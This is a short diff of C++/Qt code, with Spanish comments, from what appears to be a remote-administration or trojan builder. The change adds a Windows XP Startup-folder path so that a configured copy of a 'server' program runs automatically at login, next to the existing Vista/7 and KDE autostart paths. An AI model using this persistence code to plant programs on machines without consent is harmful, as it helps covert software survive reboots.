@@ -85,8 +85,11 @@ void MainWindow::inicio(){
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
     #ifdef Q_WS_WIN
-    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
+    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows Vista/7
         copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
+    }
+    if (directorio.exists(QDir::homePath() + "/Start Menu/Programs/Startup")) { //Windows XP
+        copiarServidor(datos,QDir::homePath() + "/Start Menu/Programs/Startup/" + this->nombreCopiable);
     }
     #else
     if (directorio.exists(QDir::homePath() + "/.kde/Autostart/")) { //Kubuntu
